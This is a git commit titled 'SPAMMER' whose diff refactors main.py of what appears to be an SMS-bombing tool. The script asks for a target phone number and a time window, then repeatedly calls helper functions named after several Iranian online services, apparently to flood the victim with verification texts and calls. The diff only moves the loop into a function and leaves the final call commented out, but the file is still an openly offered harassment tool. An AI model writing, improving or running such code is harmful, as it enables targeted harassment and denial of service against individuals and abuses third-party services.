bcadbdf35cc07acb2e27995c21c98d52b055ea7a
Mobin <Mobinatashi2@gmail.com>
2022-05-18 20:56:05 +0430

    SPAMMER

--- main.py
+++ main.py
@@ -10,31 +10,35 @@ from tapsi_api import tapsi_sms_call
 from poonisha_api import poonisha_sms
 from taghcheh_api import taghcheh_sms
 
-phone = input("Enter target phone number (example : 9XXXXXXXXXXX) : ")
-schedule = input("Enter schedule time (example : 2022-05-11 13:00:00) : ")
-end_schedule = input("Enter end schedule time (example : 2022-02-02 13:05:30) : ")
+phone_number = input("Enter target phone number (example : 9XXXXXXXXXXX) : ")
+schedule_time = input("Enter schedule time (example : 2022-02-02 13:00:00) : ")
+end_schedule_time = input("Enter end schedule time (example : 2022-02-02 13:05:30) : ")
 
-if schedule.strip() == "":
-    schedule = datetime.now()
-schedule_date_time_obj = datetime.strptime("{}".format(schedule), "%Y-%m-%d %H:%M:%S")
-end_schedule_date_time_obj = datetime.strptime("{}".format(end_schedule), "%Y-%m-%d %H:%M:%S")
 
-while True:
-    if datetime.now() > schedule_date_time_obj:
-        break
-    else:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("Waiting for schedule time...")
-        print("Current time : {}".format(datetime.now()))
-        print("Schedule time : {}".format(schedule_date_time_obj))
-        time.sleep(1)
+def spammer(phone, schedule, end_schedule):
+    if schedule.strip() == "":
+        schedule = datetime.now()
+    schedule_date_time_obj = datetime.strptime("{}".format(schedule), "%Y-%m-%d %H:%M:%S")
+    end_schedule_date_time_obj = datetime.strptime("{}".format(end_schedule), "%Y-%m-%d %H:%M:%S")
+    while True:
+        if datetime.now() > schedule_date_time_obj:
+            os.system('cls' if os.name == 'nt' else 'clear')
+            break
+        else:
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print("Waiting for schedule time...")
+            print("Current time : {}".format(datetime.now()))
+            print("Schedule time : {}".format(schedule_date_time_obj))
+            time.sleep(1)
 
-while end_schedule_date_time_obj > datetime.now():
-    cafebazar_sms(phone)
-    digikala_sms(phone)
-    divar_sms(phone)
-    sheypoor_sms(phone)
-    snapp_sms(phone)
-    tapsi_sms_call(phone)
-    poonisha_sms(phone)
-    taghcheh_sms(phone)
+    while end_schedule_date_time_obj > datetime.now():
+        cafebazar_sms(phone)
+        digikala_sms(phone)
+        divar_sms(phone)
+        sheypoor_sms(phone)
+        snapp_sms(phone)
+        tapsi_sms_call(phone)
+        poonisha_sms(phone)
+        taghcheh_sms(phone)
+
+# spammer(phone_number, schedule_time, end_schedule_time)
